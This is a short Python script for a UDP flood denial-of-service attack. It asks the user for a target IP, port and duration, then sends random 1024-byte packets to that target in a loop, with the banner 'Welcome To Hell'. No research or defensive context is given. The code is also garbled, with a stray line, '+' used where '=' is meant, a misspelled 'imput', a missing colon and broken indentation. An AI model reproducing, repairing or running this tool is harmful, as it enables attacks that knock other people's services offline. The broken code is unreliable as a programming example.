import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
g
bytes = random._urandom(1024)

os.system("cls")
print("Welcome To Hell")
print("")
ip + raw_input("Target Ip: ")
port + input("Port: ")
dur = imput("Time: ")
timeout = time.time() + dur
sent = 0

while True:
        try:
                  if time.time() > timeout
                         break
                  else:
                         pass
                  sock.sendto(bytes,(ip, port))
                  sent = sent + 1
                  print "Sent %s packets to %s through port%s"%(sent, ip, port)
          except KeyboardInterrupt:
                  sys.exit()
                  
